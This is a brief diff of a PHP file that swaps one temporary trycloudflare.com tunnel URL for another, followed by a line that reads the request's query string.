@@ -1,6 +1,6 @@
 <?php
 
-$tunnelUrl = 'https://veterans-landscapes-crossing-covering.trycloudflare.com';
+$tunnelUrl = 'https://grammar-gains-villas-def.trycloudflare.com';
 
 $query = $_SERVER['QUERY_STRING'] ?? '';
 
